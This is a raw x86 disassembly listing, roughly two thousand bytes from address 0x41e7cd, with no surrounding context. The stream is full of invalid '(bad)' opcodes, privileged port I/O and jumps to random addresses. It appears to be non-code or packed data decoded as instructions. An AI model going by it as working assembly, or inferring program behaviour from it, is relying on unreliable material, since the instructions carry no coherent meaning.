  41e7cd:	imul   ecx,DWORD PTR [edx-0x2b59f15a],0xffffffd6
  41e7d4:	lahf   
  41e7d5:	xor    al,0x59
  41e7d7:	dec    esi
  41e7d8:	xor    eax,0xbf1e68cc
  41e7dd:	mov    dl,0x4f
  41e7df:	std    
  41e7e0:	dec    BYTE PTR [edi+ecx*2+0x4855bfc5]
  41e7e7:	xor    al,BYTE PTR [ebx+0x1e09ecb6]
  41e7ed:	fisttp WORD PTR [edx+0x5d]
  41e7f0:	in     al,0xe4
  41e7f2:	pop    ss
  41e7f3:	push   ebx
  41e7f4:	aas    
  41e7f5:	push   edi
  41e7f6:	ss jp  0x41e80c
  41e7f9:	je     0x41e799
  41e7fb:	pop    ebp
  41e7fc:	push   es
  41e7fd:	mov    al,ds:0xfe0222b8
  41e802:	les    edi,FWORD PTR ds:0x485c78cb
  41e808:	adc    al,0xc1
  41e80a:	or     esi,edx
  41e80c:	lds    esp,FWORD PTR [edi+0x2ac10261]
  41e812:	sbb    eax,0x65322d1d
  41e817:	fcom   DWORD PTR [ebx+0x14]
  41e81a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e81b:	lea    ebx,[ebp+0x7c]
  41e81e:	lahf   
  41e81f:	imul   esp,DWORD PTR [eax+ebp*4],0xffffff8d
  41e823:	add    eax,0x308ca7b6
  41e828:	cld    
  41e829:	mov    dl,0xdb
  41e82b:	push   ebx
  41e82c:	ret    
  41e82d:	add    BYTE PTR [esi-0x7764818a],0xba
  41e834:	pop    ebx
  41e835:	push   es
  41e836:	stos   DWORD PTR es:[edi],eax
  41e837:	cmp    ebp,DWORD PTR ds:0xbd3b1a99
  41e83d:	in     eax,0x1e
  41e83f:	or     DWORD PTR ds:0x278b3f75,esp
  41e845:	push   0xffffffac
  41e847:	mov    ds:0xd91587c9,eax
  41e84c:	imul   edx,DWORD PTR [ebp+0x1e8d4de6],0x59
  41e853:	lock (bad) 
  41e855:	jl     0x41e814
  41e857:	inc    eax
  41e858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e859:	xor    eax,edi
  41e85b:	dec    eax
  41e85c:	mov    dh,0x14
  41e85e:	call   0x5ff67087
  41e863:	mov    edi,0x60006064
  41e868:	bts    DWORD PTR [edx-0x3e01a46f],esp
  41e86f:	scas   eax,DWORD PTR es:[edi]
  41e870:	icebp  
  41e871:	mov    ebp,0x28b6166c
  41e876:	xchg   edi,eax
  41e877:	adc    ebp,0xffffffbd
  41e87a:	xor    DWORD PTR [ebx-0xf882637],ecx
  41e880:	sub    cl,BYTE PTR [edx]
  41e882:	push   eax
  41e883:	clc    
  41e884:	scas   al,BYTE PTR es:[edi]
  41e885:	jno    0x41e8f4
  41e887:	sub    eax,0xb8095266
  41e88c:	test   al,0xda
  41e88e:	fmul   QWORD PTR [ebx+0x2f]
  41e891:	lock repz mov bl,0x97
  41e895:	loopne 0x41e82f
  41e897:	push   ss
  41e898:	repnz out 0x3d,eax
  41e89b:	mov    ah,0xc2
  41e89d:	and    ebp,DWORD PTR [eax]
  41e89f:	sahf   
  41e8a0:	xor    bh,ch
  41e8a2:	sub    al,0x25
  41e8a4:	out    0xd9,al
  41e8a6:	dec    edi
  41e8a7:	jle    0x41e921
  41e8a9:	jns    0x41e882
  41e8ab:	push   edi
  41e8ac:	pop    eax
  41e8ad:	mov    BYTE PTR cs:[esi-0x31],ah
  41e8b1:	push   ebx
  41e8b2:	ss dec ebp
  41e8b4:	pop    ds
  41e8b5:	sbb    DWORD PTR [edi+0x6f2e8177],ecx
  41e8bb:	mov    dl,0x4a
  41e8bd:	or     bl,BYTE PTR [ebx-0xc]
  41e8c0:	pop    ds
  41e8c1:	mov    ch,0xe8
  41e8c3:	push   0x12
  41e8c5:	fidivr DWORD PTR [edx+0x36]
  41e8c8:	in     eax,0xa6
  41e8ca:	pop    eax
  41e8cb:	mov    eax,0x84f671a7
  41e8d0:	enter  0x1e54,0xed
  41e8d4:	cwde   
  41e8d5:	test   BYTE PTR [esi],0x71
  41e8d8:	ss cmp ah,ch
  41e8db:	ins    DWORD PTR es:[edi],dx
  41e8dc:	bound  esp,QWORD PTR [edx+0xa]
  41e8df:	sbb    edi,esp
  41e8e1:	test   al,0xa7
  41e8e3:	mov    BYTE PTR [ebp-0x77bce952],bh
  41e8e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8ea:	(bad)  
  41e8eb:	push   ds
  41e8ec:	scas   al,BYTE PTR es:[edi]
  41e8ed:	inc    eax
  41e8ee:	sub    dh,dh
  41e8f0:	mov    al,0xf
  41e8f2:	jns    0x41e8c3
  41e8f4:	push   ebx
  41e8f5:	loopne 0x41e956
  41e8f7:	mov    ss,ebp
  41e8f9:	xor    esi,DWORD PTR [edx-0xf]
  41e8fc:	ror    DWORD PTR [ebp-0x7ff7ae4d],cl
  41e902:	cmp    esi,DWORD PTR [edx-0x5fc7309f]
  41e908:	repnz ss into 
  41e90b:	(bad)  
  41e90c:	inc    ebx
  41e90d:	inc    edx
  41e90e:	outs   dx,DWORD PTR ds:[esi]
  41e90f:	xchg   ecx,eax
  41e910:	xor    eax,0xba06ce23
  41e915:	loop   0x41e960
  41e917:	mov    ds:0xa3eacfad,al
  41e91c:	popa   
  41e91d:	call   0x962762ca
  41e922:	sub    ah,BYTE PTR [edi+0x678fea37]
  41e928:	nop
  41e929:	(bad)
  41e92d:	aaa    
  41e92e:	retf   0x27d4
  41e931:	sub    cl,dl
  41e933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e934:	mov    WORD PTR [eax+0x268c845e],fs
  41e93a:	rol    DWORD PTR [ebx-0x61],0x2f
  41e93e:	ret    
  41e93f:	sbb    dh,BYTE PTR [edi]
  41e941:	push   es
  41e942:	sbb    eax,0x8b268795
  41e947:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e948:	inc    ecx
  41e949:	cmp    edx,eax
  41e94b:	mov    DWORD PTR [ebp+0x76],edx
  41e94e:	aam    0xee
  41e950:	cmp    al,0xc6
  41e952:	or     eax,0xdae51489
  41e957:	pop    ds
  41e958:	jge    0x41e9d5
  41e95a:	pushf  
  41e95b:	lahf   
  41e95c:	rcr    BYTE PTR [edx],0xc0
  41e95f:	out    0x62,eax
  41e961:	sub    eax,0x3a82e2b0
  41e966:	pusha  
  41e967:	add    eax,0x57c92899
  41e96c:	mov    dl,0xc9
  41e96e:	and    al,0xd
  41e970:	ja     0x41e9ce
  41e972:	and    BYTE PTR [ebp-0x22a44d23],bh
  41e978:	dec    esi
  41e979:	mov    ah,0x90
  41e97b:	lods   eax,DWORD PTR ds:[esi]
  41e97c:	clc    
  41e97d:	jbe    0x41e9e3
  41e97f:	retf   0x13c5
  41e982:	jge    0x41e9a6
  41e984:	jl     0x41e94b
  41e986:	test   edx,esi
  41e988:	cmp    BYTE PTR [eax+0x2c],bh
  41e98b:	and    dl,BYTE PTR [edi-0x6b02b88f]
  41e991:	out    0x13,eax
  41e993:	sar    edx,cl
  41e995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e996:	sub    BYTE PTR [ecx-0x5c4f0881],dl
  41e99c:	shr    DWORD PTR [edi+0x71],cl
  41e99f:	sub    ah,cl
  41e9a1:	icebp  
  41e9a2:	ror    BYTE PTR [eax-0x33],0x18
  41e9a6:	xor    eax,0x796620ac
  41e9ab:	das    
  41e9ac:	sbb    eax,0x7e4d93ff
  41e9b1:	(bad)  
  41e9b3:	retf   0x88e0
  41e9b6:	and    ebp,ecx
  41e9b8:	loopne 0x41ea07
  41e9ba:	jo     0x41e9ec
  41e9bc:	jmp    0x92027588
  41e9c1:	adc    BYTE PTR [edi+0xf],0xd7
  41e9c5:	mov    eax,ds:0x90d396d6
  41e9ca:	push   esi
  41e9cb:	pusha  
  41e9cc:	out    0xb5,al
  41e9ce:	imul   esp,DWORD PTR [edx],0xffffffa0
  41e9d1:	xchg   edi,eax
  41e9d2:	icebp  
  41e9d3:	or     DWORD PTR [eax+0x7],ebx
  41e9d6:	loope  0x41ea20
  41e9d8:	push   esp
  41e9d9:	ds hlt 
  41e9db:	jmp    FWORD PTR [esi-0x3f]
  41e9de:	mov    dl,0x62
  41e9e0:	(bad)  
  41e9e1:	inc    ebp
  41e9e2:	cmc    
  41e9e3:	mov    ebp,0x4cf8056c
  41e9e8:	mov    ?,WORD PTR [eax-0x3c]
  41e9eb:	pop    edx
  41e9ec:	push   esi
  41e9ed:	clc    
  41e9ee:	fidiv  WORD PTR [ebx]
  41e9f0:	in     eax,dx
  41e9f1:	test   eax,0x48279c89
  41e9f6:	pop    esi
  41e9f7:	out    0xf0,al
  41e9f9:	inc    esp
  41e9fa:	jns    0x41e997
  41e9fc:	sbb    BYTE PTR [ecx],bl
  41e9fe:	sbb    DWORD PTR [esi+0x8],edx
  41ea01:	and    eax,0x4e28a4c9
  41ea06:	daa    
  41ea07:	inc    ebx
  41ea08:	les    edi,FWORD PTR [bp+si]
  41ea0b:	out    dx,al
  41ea0c:	add    DWORD PTR [edi-0x233efae3],esi
  41ea12:	add    BYTE PTR [ebp+0x10],ch
  41ea15:	add    cl,BYTE PTR [ebx]
  41ea17:	imul   ebx,esi,0x3b
  41ea1a:	pop    ds
  41ea1b:	mov    eax,ds:0x7962ca7f
  41ea20:	(bad)  
  41ea22:	adc    eax,0x1b9aa5cc
  41ea27:	(bad)  
  41ea28:	push   edx
  41ea29:	mov    ah,0x53
  41ea2b:	pop    edi
  41ea2c:	sub    al,0xc3
  41ea2e:	cld    
  41ea2f:	loope  0x41ea3b
  41ea31:	ss mov cl,0x8e
  41ea34:	inc    ebp
  41ea35:	in     eax,0xe8
  41ea37:	out    dx,eax
  41ea38:	pop    eax
  41ea39:	test   DWORD PTR [edi],eax
  41ea3b:	call   0x671f6229
  41ea40:	jecxz  0x41ea66
  41ea42:	test   eax,0x676d10a2
  41ea47:	cmp    eax,0xe11fbd4c
  41ea4c:	cmp    bh,BYTE PTR [edi]
  41ea4e:	pop    esp
  41ea4f:	rcr    DWORD PTR [esi],cl
  41ea51:	ins    BYTE PTR es:[edi],dx
  41ea52:	lds    ebp,FWORD PTR [esi+0x15]
  41ea55:	xlat   BYTE PTR ds:[ebx]
  41ea56:	xor    al,0xe5
  41ea58:	daa    
  41ea59:	xchg   ecx,eax
  41ea5a:	jmp    0x1149db5f
  41ea5f:	push   esi
  41ea60:	mov    cl,0x2d
  41ea62:	out    dx,eax
  41ea63:	(bad)  
  41ea64:	imul   esp,DWORD PTR [edx-0x2d],0x43b300c8
  41ea6b:	test   bl,0xad
  41ea6e:	xor    al,bl
  41ea70:	data16 add BYTE PTR [ebx-0xc],0x5b
  41ea75:	inc    esi
  41ea76:	retw   
  41ea78:	and    eax,ebp
  41ea7a:	add    al,0xb0
  41ea7c:	xor    DWORD PTR [ebp*2-0x4eac424],0x6d
  41ea84:	mov    fs,WORD PTR [eax]
  41ea86:	xor    DWORD PTR [edx+edi*8],esi
  41ea89:	mov    ecx,0x2090fb51
  41ea8e:	jecxz  0x41ead5
  41ea90:	test   al,0x33
  41ea92:	stc    
  41ea93:	test   DWORD PTR [edx-0x60],eax
  41ea96:	xlat   BYTE PTR ds:[ebx]
  41ea97:	dec    edi
  41ea98:	outs   dx,BYTE PTR ds:[esi]
  41ea99:	mov    ds:0xb4c85e82,al
  41ea9e:	inc    esp
  41ea9f:	(bad)  
  41eaa0:	nop
  41eaa1:	stos   DWORD PTR es:[edi],eax
  41eaa2:	xchg   ebp,eax
  41eaa3:	adc    DWORD PTR [ebx-0x7d],ebx
  41eaa6:	pop    edi
  41eaa7:	pop    edx
  41eaa8:	mov    bl,0x11
  41eaaa:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaac:	pusha  
  41eaad:	push   edx
  41eaae:	cmp    al,0x10
  41eab0:	call   0xe64ffa6b
  41eab5:	push   cs
  41eab6:	mov    esp,0xc53eb6f
  41eabb:	mov    WORD PTR [eax-0x68],cs
  41eabe:	mov    eax,ds:0xce10e39d
  41eac3:	(bad)  
  41eac4:	out    0x13,eax
  41eac6:	add    BYTE PTR [edx-0x336638a8],0xd1
  41eacd:	pop    ss
  41eace:	les    ecx,FWORD PTR [edi+0x4cd8781b]
  41ead4:	fdiv   DWORD PTR [eax+0x62]
  41ead7:	xlat   BYTE PTR ds:[ebx]
  41ead8:	and    al,BYTE PTR [edi+0x1f9e7be7]
  41eade:	aas    
  41eadf:	cmp    al,0x9d
  41eae1:	inc    eax
  41eae2:	loopne 0x41eb4c
  41eae4:	dec    edi
  41eae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eae6:	add    eax,0x8763cb23
  41eaeb:	sbb    BYTE PTR [edx+0x43c74a48],dh
  41eaf1:	and    al,BYTE PTR [ebx]
  41eaf3:	les    esi,FWORD PTR [esi]
  41eaf5:	push   es
  41eaf6:	ss data16 js 0x41ea7c
  41eafa:	or     DWORD PTR [edi+0x49],0xfbd6b142
  41eb01:	lods   al,BYTE PTR ds:[esi]
  41eb02:	add    BYTE PTR [ebx+0x5c948c52],ah
  41eb08:	jb     0x41eadf
  41eb0a:	or     esp,ecx
  41eb0c:	or     al,0x14
  41eb0e:	arpl   WORD PTR [eax+eiz*8+0x10],si
  41eb12:	out    dx,al
  41eb13:	gs call 0x542c6982
  41eb19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb1a:	rol    DWORD PTR [ebx],cl
  41eb1c:	and    al,0xb9
  41eb1e:	fnstenv [edi-0x3c239fc4]
  41eb24:	pusha  
  41eb25:	loope  0x41eb6e
  41eb27:	es and al,bh
  41eb2a:	mov    ebp,0x7e64e2c2
  41eb2f:	sbb    eax,0xa7c9edbc
  41eb34:	leave  
  41eb35:	shl    BYTE PTR [ecx],cl
  41eb37:	(bad)  
  41eb38:	popf   
  41eb39:	aam    0x4c
  41eb3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb3c:	arpl   WORD PTR [ebx-0x15],di
  41eb3f:	sub    eax,0xf3e2a2c4
  41eb44:	lods   eax,DWORD PTR ds:[esi]
  41eb45:	push   0xa271cbe3
  41eb4a:	jns    0x41ead3
  41eb4c:	inc    esp
  41eb4d:	jb     0x41eb7a
  41eb4f:	xor    ah,BYTE PTR [edi+0x69]
  41eb52:	xchg   ebx,eax
  41eb53:	sahf   
  41eb54:	mov    ebp,0x10b398a0
  41eb59:	add    bh,dh
  41eb5b:	pop    esi
  41eb5c:	or     eax,0x15b64862
  41eb61:	(bad)  
  41eb63:	inc    ecx
  41eb64:	pop    edi
  41eb65:	pop    ebx
  41eb66:	enter  0x47fb,0x1
  41eb6a:	adc    DWORD PTR [ecx],esp
  41eb6c:	ins    DWORD PTR es:[edi],dx
  41eb6d:	hlt    
  41eb6e:	arpl   WORD PTR [edi-0x1c],cx
  41eb71:	fcmove st,st(1)
  41eb73:	leave  
  41eb74:	mov    eax,ds:0xa0bb121a
  41eb79:	repnz and dh,BYTE PTR [ebp+0x44]
  41eb7d:	xor    al,0x7f
  41eb7f:	lahf   
  41eb80:	das    
  41eb81:	cmp    al,0x8e
  41eb83:	adc    BYTE PTR ds:0xfc750db4,dh
  41eb89:	pop    edx
  41eb8a:	mov    ebp,0x96ef0d56
  41eb8f:	loop   0x41eba6
  41eb91:	jp     0x41eb58
  41eb93:	shr    DWORD PTR [eax],1
  41eb95:	sub    DWORD PTR [edi],esp
  41eb97:	mov    fs,eax
  41eb99:	jns    0x41eb65
  41eb9b:	cmp    al,0xc
  41eb9d:	ja     0x41eb69
  41eb9f:	dec    edi
  41eba0:	in     eax,dx
  41eba1:	xor    DWORD PTR [esi],eax
  41eba3:	sbb    bl,BYTE PTR [edi-0x1ec3334e]
  41eba9:	jno    0x41ec07
  41ebab:	jnp    0x41ec19
  41ebad:	ja     0x41eba8
  41ebaf:	cli    
  41ebb0:	and    DWORD PTR [ecx-0x70d9c4ea],0xa6d7fc1c
  41ebba:	inc    ebp
  41ebbb:	cwde   
  41ebbc:	fwait
  41ebbd:	jge    0x41ec30
  41ebbf:	xchg   esp,eax
  41ebc0:	mov    esi,0x23f933c9
  41ebc5:	ds (bad) 
  41ebc7:	mov    ds:0x24668ca,eax
  41ebcc:	push   eax
  41ebcd:	loopne 0x41ebed
  41ebcf:	ins    DWORD PTR es:[edi],dx
  41ebd0:	inc    ecx
  41ebd1:	ret    0x6b66
  41ebd4:	mov    edi,0x27f77e46
  41ebd9:	fmul   DWORD PTR [ebx]
  41ebdb:	inc    ecx
  41ebdc:	mov    dh,0xa4
  41ebde:	pop    esp
  41ebdf:	pop    eax
  41ebe0:	xchg   ebx,eax
  41ebe1:	(bad)  
  41ebe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebe3:	mov    eax,ds:0x630201d4
  41ebe8:	fcmovnu st,st(6)
  41ebea:	sub    BYTE PTR [ebp+0x64],dh
  41ebed:	xor    eax,0x31d55a14
  41ebf2:	mov    ds:0xfae85a6e,eax
  41ebf7:	dec    eax
  41ebf8:	dec    esi
  41ebf9:	add    al,0x8
  41ebfb:	pusha  
  41ebfc:	aam    0x55
  41ebfe:	sti    
  41ebff:	xor    eax,edi
  41ec01:	jmp    0x4e91f306
  41ec06:	lds    esi,FWORD PTR [eax]
  41ec08:	test   ebx,ebp
  41ec0a:	or     BYTE PTR [esp+ebp*4+0x51],0x49
  41ec0f:	(bad)  
  41ec10:	daa    
  41ec11:	pop    ecx
  41ec12:	mov    ch,0xe3
  41ec14:	jne    0x41eba4
  41ec16:	les    ebp,FWORD PTR [ecx]
  41ec18:	and    edi,edi
  41ec1a:	rol    BYTE PTR [ecx-0x7b],0xf0
  41ec1e:	xlat   BYTE PTR ds:[ebx]
  41ec1f:	and    BYTE PTR [edx],cl
  41ec21:	test   al,0x83
  41ec23:	lahf   
  41ec24:	nop
  41ec25:	stos   BYTE PTR es:[edi],al
  41ec26:	cwde   
  41ec27:	push   0x5bee07a3
  41ec2c:	repz test eax,0xcba95593
  41ec32:	or     al,0xc5
  41ec34:	popa   
  41ec35:	fs xchg ebx,eax
  41ec37:	push   esp
  41ec38:	rcr    BYTE PTR [esi-0x3e],cl
  41ec3b:	loope  0x41ec78
  41ec3d:	test   BYTE PTR [ebp-0x3d],0xf5
  41ec41:	addr16 xchg ecx,eax
  41ec43:	fcomp  DWORD PTR ds:0x8b9b65b6
  41ec49:	ret    0x50fa
  41ec4c:	cmp    ebp,DWORD PTR [ecx-0x6da99825]
  41ec52:	stos   DWORD PTR es:[edi],eax
  41ec53:	adc    edi,ebp
  41ec55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec56:	jge    0x41ebfe
  41ec58:	jecxz  0x41ec37
  41ec5a:	(bad)  
  41ec5b:	pop    ss
  41ec5c:	add    eax,0xacca4f93
  41ec61:	loop   0x41ecce
  41ec63:	test   BYTE PTR [edi+0x36],ah
  41ec66:	dec    esi
  41ec67:	cmp    DWORD PTR [bx+si+0x13a9],ecx
  41ec6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec6e:	fwait
  41ec6f:	cmp    ah,BYTE PTR [edi-0x2eb4ccc5]
  41ec75:	push   edx
  41ec76:	inc    esi
  41ec77:	pop    ebx
  41ec78:	mov    dh,0xe1
  41ec7a:	pop    edx
  41ec7b:	ins    DWORD PTR es:[di],dx
  41ec7d:	lahf   
  41ec7e:	add    bh,BYTE PTR [ecx]
  41ec80:	push   cs
  41ec81:	push   eax
  41ec82:	cmp    ecx,DWORD PTR [edx+0x1237fa4c]
  41ec88:	sar    ebp,0x80
  41ec8b:	pop    esp
  41ec8c:	dec    eax
  41ec8d:	lods   al,BYTE PTR ds:[esi]
  41ec8e:	cld    
  41ec8f:	in     eax,0x1c
  41ec91:	les    ebp,FWORD PTR [esi-0x37625942]
  41ec97:	inc    eax
  41ec98:	mov    ebx,0x4dd0108d
  41ec9d:	popaw  
  41ec9f:	jbe    0x41ed1d
  41eca1:	std    
  41eca2:	inc    edi
  41eca3:	xchg   al,bh
  41eca5:	push   ebx
  41eca6:	dec    eax
  41eca7:	mov    cl,0x6b
  41eca9:	push   0x61d782cb
  41ecae:	push   0xffffffd1
  41ecb0:	push   ecx
  41ecb1:	sub    bh,BYTE PTR [esi+0x73]
  41ecb4:	fstp   DWORD PTR [edx-0x4f]
  41ecb7:	arpl   si,bp
  41ecb9:	sub    ecx,0x90663355
  41ecbf:	int    0x44
  41ecc1:	daa    
  41ecc2:	enter  0xbd7c,0x9d
  41ecc6:	mov    al,ds:0x719df50e
  41eccb:	jmp    0xa68ecbea
  41ecd0:	mov    esi,0xbd02d386
  41ecd5:	fwait
  41ecd6:	outs   dx,BYTE PTR ds:[esi]
  41ecd7:	sub    dl,bh
  41ecd9:	sub    ebp,edi
  41ecdb:	repz jle 0x41ec64
  41ecde:	cmp    edx,DWORD PTR [ecx]
  41ece0:	or     dl,BYTE PTR [ecx+0x14]
  41ece3:	inc    ebx
  41ece4:	dec    eax
  41ece5:	mov    ebx,0x3c536a25
  41ecea:	(bad)  
  41eceb:	sbb    al,BYTE PTR [esi+0x77822fe8]
  41ecf1:	sub    bh,dl
  41ecf3:	mov    edi,0xdd629c13
  41ecf8:	imul   eax,edi,0x6b8127a9
  41ecfe:	popf   
  41ecff:	mov    esi,0x2621cad6
  41ed04:	cmp    al,0xd8
  41ed06:	lea    edx,[ecx+0x54]
  41ed09:	sbb    DWORD PTR [ecx-0x5ce3759b],eax
  41ed0f:	pop    eax
  41ed10:	jg     0x41ed06
  41ed12:	mov    edx,0xf3c26a61
  41ed17:	(bad)  
  41ed19:	sub    DWORD PTR [edx-0x66],ebx
  41ed1c:	shl    ebp,cl
  41ed1e:	loop   0x41ed51
  41ed20:	in     eax,0x66
  41ed22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed23:	cli    
  41ed24:	sbb    eax,0x5ae83315
  41ed29:	fiadd  DWORD PTR [ecx+0x39]
  41ed2c:	das    
  41ed2d:	push   ss
  41ed2e:	xchg   ebp,eax
  41ed2f:	dec    esp
  41ed30:	fisubr DWORD PTR [edx]
  41ed32:	dec    edx
  41ed33:	jbe    0x41eccc
  41ed35:	add    al,bh
  41ed37:	xchg   esp,eax
  41ed38:	pop    edx
  41ed39:	xchg   esi,eax
  41ed3a:	lods   al,BYTE PTR ds:[esi]
  41ed3b:	jg     0x41ed1c
  41ed3d:	test   al,0xb8
  41ed3f:	add    dl,BYTE PTR [ebp+eax*2+0x3]
  41ed43:	mov    ah,0x49
  41ed45:	clc    
  41ed46:	push   ecx
  41ed47:	mov    edi,0x7a580371
  41ed4c:	outs   dx,BYTE PTR ds:[esi]
  41ed4d:	les    ebp,FWORD PTR [edx+0x790c2e09]
  41ed53:	jne    0x8ddfe888
  41ed59:	pop    esi
  41ed5a:	lods   al,BYTE PTR ds:[esi]
  41ed5b:	in     al,dx
  41ed5c:	pop    es
  41ed5d:	ja     0x41ecfa
  41ed5f:	(bad)
  41ed63:	inc    esp
  41ed64:	div    DWORD PTR [edx+eax*4+0x5c]
  41ed68:	popa   
  41ed69:	and    bl,BYTE PTR [edx]
  41ed6b:	mov    bh,0xd0
  41ed6d:	mov    eax,ds:0x6816bd35
  41ed72:	cmc    
  41ed73:	push   ss
  41ed74:	mov    esi,0xe1c3fd1c
  41ed79:	adc    esp,ecx
  41ed7b:	in     eax,0xf
  41ed7d:	xchg   ebx,eax
  41ed7e:	jnp    0x41ed5a
  41ed80:	mov    bl,bh
  41ed82:	adc    al,0x52
  41ed84:	push   0x11
  41ed86:	adc    eax,0x8eebe829
  41ed8b:	(bad)  
  41ed8d:	popa   
  41ed8e:	retf   0x47a6
  41ed91:	clc    
  41ed92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed93:	cld    
  41ed94:	inc    eax
  41ed95:	adc    BYTE PTR [esi-0x3f],dl
  41ed98:	inc    edx
  41ed99:	pop    ebx
  41ed9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed9b:	test   BYTE PTR [ebx+edi*4+0x6744d067],ah
  41eda2:	add    BYTE PTR [ebp+0x62],cl
  41eda5:	or     eax,0x60d5aa9e
  41edaa:	mov    al,0x3d
  41edac:	nop
  41edad:	jp     0x41eddd
  41edaf:	in     al,dx
  41edb0:	mov    al,ds:0xdf98f9ae
  41edb5:	icebp  
  41edb6:	and    eax,0xafca77fb
  41edbb:	iret   
  41edbc:	out    0x9,al
  41edbe:	mov    eax,ds:0xd9d7adfb
  41edc3:	mov    eax,0xd7bd7c29
  41edc8:	sub    eax,0xe1975a5f
  41edcd:	xchg   ebp,eax
  41edce:	xchg   DWORD PTR [ecx-0x7],ebx
  41edd1:	inc    ebp
  41edd2:	outs   dx,DWORD PTR ds:[esi]
  41edd3:	dec    eax
  41edd4:	ret    
  41edd5:	mov    dl,0x51
  41edd7:	add    eax,0xd888b283
  41eddc:	add    eax,DWORD PTR [edx+ebp*8]
  41eddf:	mov    bl,0x1b
  41ede1:	in     eax,0x9c
  41ede3:	sbb    esp,DWORD PTR [esi]
  41ede5:	fcomp  QWORD PTR [esi]
  41ede7:	call   0x19b9:0xe2c90112
  41edee:	retf   0x50a0
  41edf1:	(bad)  
  41edf2:	lahf   
  41edf3:	sub    ch,bl
  41edf5:	(bad)  
  41edf6:	xchg   esp,eax
  41edf7:	mov    ch,0x24
  41edf9:	sub    DWORD PTR [edi+0x61],edx
  41edfc:	addr16 jbe 0x41ee69
  41edff:	imul   eax,DWORD PTR [edi+esi*8],0xb
  41ee03:	stos   BYTE PTR es:[edi],al
  41ee04:	and    ch,BYTE PTR [ebx+0x6f56b4df]
  41ee0a:	ret    
  41ee0b:	push   esi
  41ee0c:	int3   
  41ee0d:	dec    ecx
  41ee0e:	sub    BYTE PTR [edi-0xc],ch
  41ee11:	hlt    
  41ee12:	int3   
  41ee13:	aas    
  41ee14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee15:	fistp  QWORD PTR [esi+0x5c26e5a5]
  41ee1b:	ror    BYTE PTR [eax-0x56],1
  41ee1e:	or     al,BYTE PTR [edx+esi*2-0x6fb5043c]
  41ee25:	or     dl,BYTE PTR [edx-0x67e453cd]
  41ee2b:	sbb    BYTE PTR [edx-0x17],cl
  41ee2e:	test   eax,0x926c3e2b
  41ee33:	mov    dl,0xb
  41ee35:	add    al,0x54
  41ee37:	aas    
  41ee38:	pop    ebx
  41ee39:	shl    DWORD PTR [eax+eax*4+0x15],cl
  41ee3d:	mov    bl,0x1b
  41ee3f:	sti    
  41ee40:	pop    ebp
  41ee41:	repnz sbb DWORD PTR [ebp+0x8],eax
  41ee45:	mov    al,0xd8
  41ee47:	fild   WORD PTR [ecx+0x1d]
  41ee4a:	ja     0x41ee7b
  41ee4c:	cmp    ah,BYTE PTR ss:[edi-0x3d0df25c]
  41ee53:	js     0x41ee6c
  41ee55:	sub    BYTE PTR [edi+0x78],0x44
  41ee59:	gs out 0x8b,eax
  41ee5c:	mov    al,0x5e
  41ee5e:	stc    
  41ee5f:	cmp    ebx,eax
  41ee61:	mov    ebx,0x4445fd4c
  41ee66:	fsubr  DWORD PTR [edx]
  41ee68:	sti    
  41ee69:	add    ch,dl
  41ee6b:	xchg   edx,eax
  41ee6c:	not    esi
  41ee6e:	or     dh,BYTE PTR [edx+0x7e]
  41ee71:	mov    edi,0xb87c9118
  41ee76:	pop    esi
  41ee77:	mov    dh,0x5a
  41ee79:	ret    
  41ee7a:	repz mov WORD PTR [edi],ds
  41ee7d:	add    eax,0x3177bf56
  41ee82:	mov    ds:0xec78f55,al
  41ee87:	pop    ebx
  41ee88:	sub    esp,DWORD PTR [ecx]
  41ee8a:	mov    ds:0x90659fde,al
  41ee8f:	sbb    cl,BYTE PTR [ecx-0x8]
  41ee92:	aaa    
  41ee93:	in     eax,0x8
  41ee95:	or     edi,DWORD PTR [ebp-0x3b]
  41ee98:	adc    eax,eax
  41ee9a:	pop    esp
  41ee9b:	sbb    DWORD PTR [ebp+0xbdd69f2],esp
  41eea1:	(bad)  
  41eea2:	adc    BYTE PTR [eax-0x5d2d9076],cl
  41eea8:	mov    eax,ds:0x66054cd4
  41eead:	fs jns 0x41ef1a
  41eeb0:	or     eax,0x9460bf5c
  41eeb5:	mov    ds:0x9c53fbed,eax
  41eeba:	or     al,0x8b
  41eebc:	pop    ecx
  41eebd:	mov    eax,0x9bae72e1
  41eec2:	daa    
  41eec3:	scas   eax,DWORD PTR es:[edi]
  41eec4:	clc    
  41eec5:	pop    eax
  41eec6:	outs   dx,DWORD PTR ds:[esi]
  41eec7:	pushf  
  41eec8:	sahf   
  41eec9:	ss loopne 0x41ee50
  41eecc:	sbb    al,0xda
  41eece:	or     eax,0x62206be5
  41eed3:	jmp    0x767e89d4
  41eed8:	test   DWORD PTR [edx-0x5b],esp
  41eedb:	jecxz  0x41eea7
  41eedd:	call   0xef76:0x6d60be7f
  41eee4:	dec    ebp
  41eee5:	mov    ah,0x5f
  41eee7:	add    BYTE PTR [esi-0x222dc208],0x3d
  41eeee:	aaa    
  41eeef:	ins    DWORD PTR es:[edi],dx
  41eef0:	push   edi
  41eef1:	push   ebx
  41eef2:	test   DWORD PTR [edx+0x71110377],0x2d690724
  41eefc:	sahf   
  41eefd:	or     ah,dh
  41eeff:	mov    eax,ds:0xe0af9758
  41ef04:	adc    bl,BYTE PTR [eax-0x8]
  41ef07:	pop    ecx
  41ef08:	xor    eax,0xc4c83aad
  41ef0d:	fmul   DWORD PTR [ecx-0x6]
  41ef10:	stos   BYTE PTR es:[edi],al
